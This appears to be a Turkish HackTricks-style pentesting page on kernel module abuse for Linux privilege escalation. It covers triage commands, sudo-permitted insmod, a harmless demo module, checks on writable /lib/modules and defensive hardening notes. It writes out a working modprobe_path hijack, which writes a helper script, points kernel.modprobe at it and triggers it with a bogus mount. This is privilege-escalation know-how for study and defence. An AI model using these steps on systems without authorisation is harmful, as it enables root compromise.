# Kernel Modülleri ve modprobe Kötüye Kullanımı

{{#include ../../banners/hacktricks-training.md}}

## Kernel modülü ve modül yükleme yanlış yapılandırmaları

Kernel modülü desteği, Linux privilege escalation incelemesi sırasında yüksek etkili bir alandır. Her unsigned-module mesajını tek başına exploitable olarak değerlendirmeyin; bunun yerine pratik sorulara yanıt bulmak için kullanın.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Mevcut kullanıcı `sudo`, capabilities veya yazılabilir bir helper path üzerinden modül yükleyebilir mi?
- Modül yükleme hâlâ etkin mi?
- Modül signature enforcement devre dışı mı?
- Modül dizinleri veya modül dosyaları yazılabilir mi?
- Ne olduğunu doğrulamak için kernel logları okunabilir mi?

Hızlı triage, aşağıdaki modül durumu, signature, logging ve modül ağacı kontrolleriyle başlar.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Yorum:

- `modules_disabled=1`, modüllerin ne yüklenebilmesini ne de kaldırılabilmesini sağlar ve değer yeniden başlatılana kadar `0` olarak sıfırlanamaz.<sup>[[1]](#references)</sup>
- Kernel command line üzerindeki `module.sig_enforce=1` veya `CONFIG_MODULE_SIG_FORCE=y`, geçerli şekilde imzalanmış modülleri zorunlu kılar; aksi takdirde imzasız modüller yüklenebilir ve kernel tainted durumuna gelebilir.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0`, `dmesg` üzerinde herhangi bir kısıtlama uygulamaz; değer `1` olduğunda erişim için `CAP_SYSLOG` gerekir.<sup>[[1]](#references)</sup>
- `/lib/modules/$(uname -r)/` altındaki yazılabilir yollar tehlikelidir; çünkü `modprobe`, modülleri yüklerken bu ağacı ve bağımlılık verilerini arar.<sup>[[8]](#references)</sup>

### Bir modülü yükleme ve kernel çıktısını okuma

Yerel bir modülü yüklemek için meşru izniniz varsa `insmod`, sağladığınız tam `.ko` dosyasını ekler. Modülün init function'ı yüklemenin bir parçası olarak çalışır ve `printk()` ile yazılan mesajlar, normalde `dmesg` ile okunan kernel log buffer'a gider.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Minimal bir review workflow'unda metadata'yı incelemek için `modinfo`, bir modülü yüklemek ve kaldırmak için `insmod` ve `rmmod`, yüklenmiş durumu doğrulamak için `lsmod` ve kernel loglarını incelemek için `dmesg` kullanılır.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Eğer `sudo -l` `insmod`, `modprobe` veya bunların etrafındaki bir wrapper'a izin veriyorsa bunu kritik olarak değerlendirin: `sudo -l`, komutu çalıştıran kullanıcının ayrıcalıklarını listeler ve bir kernel module yüklemek `CAP_SYS_MODULE` gerektirir.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Sudo ile izin verilen `insmod`

Bir kullanıcının `insmod` çalıştırmasına izin veren bir sudo kuralı, normal bir yönetim yardımcısına izin vermekle karşılaştırılamaz. Modülün başlatma kodu ekleme işleminin bir parçası olarak çalışır; bu nedenle pratik inceleme sorusu, bu kullanıcının yüklenen modülü seçip seçemeyeceği veya değiştirebileceğidir.<sup>[[3]](#references)</sup>

Aşağıdaki genel inceleme akışı, aday bir modül için bu denetleme, yükleme, durum, log ve kaldırma kontrollerini tekrarlar.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Kullanıcı rastgele bir `.ko` dosyası sağlayabiliyorsa, yetkilendirilmiş bir assessment kapsamında bu kural full system compromise olarak değerlendirilmelidir. Daha güvenli bir operasyonel yaklaşım, module loading işlemini sudo üzerinden devretmekten kaçınmaktır; bu kaçınılmazsa exact path, sahiplik, permissions, signing policy ve removal workflow kısıtlanmalıdır.<sup>[[3]](#references)[[10]](#references)</sup>

Kontrollü bir lab ortamında zararsız bir module-building pattern için aşağıda minimal bir source ve Makefile gösterilmiştir; `make -C /lib/modules/$(uname -r)/build M=$PWD` biçimi, external modules için kernel tarafından belgelenen kbuild workflow'unu izler.<sup>[[5]](#references)[[7]](#references)</sup>
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Yalnızca yetkili bir laboratuvarda derleyip yükleyin; kbuild harici modülü derler ve yükleme/kaldırma komutları kernel module arayüzlerini çağırır.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### `kernel.modprobe` / `modprobe_path` kötüye kullanım kontrolleri

`kernel.modprobe`, kernel'in modül otomatik yükleme istekleri için çalıştırdığı userspace helper'ı belirtir; bu sysctl, açık modül eklemeyi değil otomatik yüklemeyi etkiler. Bir saldırgan bunu yazılabilir bir executable path ile değiştirebilir ve bir modül isteğini tetikleyebilirse, bu helper ayrıcalıklı bir code-execution yolu hâline gelir.<sup>[[1]](#references)</sup>

Mevcut helper path'ini kernel sysctl arayüzü üzerinden kontrol edin ve hedefin sahipliğini ve mode'unu inceleyin.<sup>[[1]](#references)</sup>
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
sysctl, devredilmiş sudo kurallarının veya dosya yeteneklerinin etkilenip etkilenemeyeceğini kontrol edin.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Aşağıdaki yalnızca lab ortamına yönelik pattern, helper path'i değiştirir ve belgelenmiş bir module-autoload request'i tetikler; bunu yalnızca izole ve yetkilendirilmiş bir sistemde kullanın.<sup>[[1]](#references)</sup>

Güncel Linux kernel'larında generic trigger olarak bilinmeyen bir executable kullanmayın: legacy custom binary-format module autoloading, Linux 6.14'te kaldırılmıştır; kernel documentation ise bilinmeyen bir filesystem type'ını module-autoload request path'i olarak tanımlar.<sup>[[1]](#references)[[11]](#references)</sup>
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Güçlendirilmiş sistemlerde, izinler ayrıcalıksız yazmaları `kernel.modprobe` konumuna engellediğinde, yardımcı program yolu yazılabilir olmadığında veya modül otomatik yüklemesi devre dışı bırakıldığında bu işlem başarısız olmalıdır.<sup>[[1]](#references)</sup>

### Yazılabilir `/lib/modules` incelemesi

Yazılabilir modül dizinleri, `modprobe` daha sonra nasıl çağrıldığına bağlı olarak modül değiştirmeye, kötü amaçlı modül yerleştirmeye veya otomatik yükleme kötüye kullanımına olanak tanıyabilir; `modprobe`, modülleri çözümlerken `/lib/modules/$(uname -r)` konumunu arar ve bağımlılık verilerini kullanır.<sup>[[8]](#references)</sup>

Etkin kernel sürümünün modül ağacındaki yazılabilir modül dosyalarını ve bağımlılık/alias metadata'sını inceleyin.<sup>[[8]](#references)</sup>
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Yazılabilir modül içeriği bulursanız, `modprobe` bağımlılıkları nasıl çözdüğünü ve `modinfo` modül meta verilerini nasıl raporladığını inceleyin.<sup>[[8]](#references)[[12]](#references)</sup>
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Savunma notları:

- `/lib/modules` dizininin sahibini `root:root` olarak tutun ve kullanıcılar tarafından yazılabilir olmamasını sağlayın.<sup>[[8]](#references)</sup>
- Operasyonel olarak mümkün olan sistemlerde, önyüklemeden sonra `kernel.modules_disabled=1` değerini ayarlayın.<sup>[[1]](#references)</sup>
- Yüklenebilir modüllere ihtiyaç duyan sistemlerde modül imzalamayı zorunlu kılın.<sup>[[2]](#references)</sup>
- `/proc/sys/kernel/modprobe` ve `/lib/modules` üzerine yazma işlemlerini ve beklenmeyen `insmod`/`modprobe` yürütmelerini izleyin.<sup>[[1]](#references)[[8]](#references)</sup>

## References

- [1] [/proc/sys/kernel/ için Documentation — The Linux Kernel documentation](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kernel module signing facility — The Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux manual page](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux manual page](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Driver Basics — The Linux Kernel documentation](https://docs.kernel.org/driver-api/basics.html)
- [6] [Message logging with printk — The Linux Kernel documentation](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Building External Modules — The Linux Kernel documentation](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Merge tag 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux manual page](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux manual page](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux manual page](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux manual page](https://man7.org/linux/man-pages/man8/getcap.8.html)
{{#include ../../banners/hacktricks-training.md}}
